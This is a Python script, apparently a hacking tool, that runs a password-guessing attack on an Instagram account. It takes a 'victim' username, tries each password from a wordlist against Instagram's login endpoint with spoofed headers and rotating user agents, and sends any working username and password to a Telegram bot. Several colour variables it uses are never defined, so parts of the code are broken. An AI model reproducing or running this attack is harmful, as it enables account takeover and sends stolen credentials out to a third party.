import requests
import random
import os
from user_agent import generate_user_agent
import pyfiglet
os.system('clear')
os.system('clear')

# = = = = = = = = = = = = 

# Color codes
Z = '\033[1;31m' # Red
X = '\033[1;33m' # Yellow
F = '\033[2;32m' # Green
A = '\033[2;34m' # Blue
C = '\033[2;35m' # Pink
B = '\033[2;36m' # Sky Blue
Y = '\033[1;34m' # Light Blue

# Logo
logo = f'''{Z}
         .e$$$$e.
       e$$$$$$$$$$e
      $$$$$$by$$$$$$
     d$$$$$$$$$$$$$$b
     $$Almunharif$$$
    4$$$$$$$$$$$$$$$$F
    4$$$$$$$$$$$$$$$$F
     $$$" "$$$$" "$$$
     $$F   4$$F   4$$
     '$F 🔥4$$F 🔥 8 $"
      $$   $$$$   $P
      4$$$$$"^$$$$$%
       $$$$F  4$$$$
        "$$$ee$$$"
        . *$$$$F4
         $     .$  
         "$$$$$$"
          ^$$$$
 4$$c       ""       .$$r
 ^$$$b              e$$$"
 d$$$$$e          z$$$$$b
4$$$*$$$$$c    .$$$$$*$$$r
 ""    ^*$$$be$$$*"    ^"
          "$$$$"
        .d$$P$$$b
       d$$P   ^$$$b
   .ed$$$"      "$$$be.
 $$$$$$P          *$$$$$$
4$$$$$P            $$$$$$"
 "*$$$"            ^$$P
    ""              ^"
'''

# Print the logo
print(logo)
print(f'{a36}════════════════════════════════')

# Hardcode the Telegram ID and Token
ID = 'your_telegram_id_here'  # Replace with your actual Telegram ID
token = 'your_telegram_bot_token_here'  # Replace with your Telegram Bot Token

# Create a session for requests
r = requests.Session()

# Open the password file
file = 'pass.txt'
rfile = open(file, 'r')
os.system('clear')
print(logo)

# Get the victim's username
us = input(f'{a22}Enter  User Victim  {a20}➤  : {Z} ')
os.system('clear')
print(logo)

# Loop through the passwords and attempt to log in
while True:
    username = us
    password = rfile.readline().split('\n')[0]
    
    url = 'https://www.instagram.com/accounts/login/ajax/'
    
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip,deflate,br',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-length': '269',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': generate_user_agent(),
        'x-csrftoken': 'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '8a8118fa7d40',
        'x-requested-with': 'XMLHttpRequest'
    }
    
    data = {
        'username': username,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }

    # Make the login request
    req_login = r.post(url, headers=headers, data=data, proxies=None)
    
    # If login is successful
    if 'userId' in req_login.text:
        print(F+'User name : '+username)
        print(F+'Password : '+password)
        
        # Send message to Telegram
        tlg = f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ✅ 𝘼𝙇𝙈𝙀𝙐𝙉𝙃𝙍𝙀𝙁
←•━━━━━━━━━━━━•→
🏆 𝗨𝗦𝗘𝗥  ➤ {username}
💢 𝗣𝗔𝗦𝗦  ➤ {password}
←•━━━━━━━━━━━━•→
🚫 𝐁𝐘 » @VlP_12'''
        
        i = requests.post(tlg)
        break  # Stop after sending the message
    
    else:
        print(Z+'Error: '+password)
        print(f'{a36}•━━━━━━━━━━━━•')
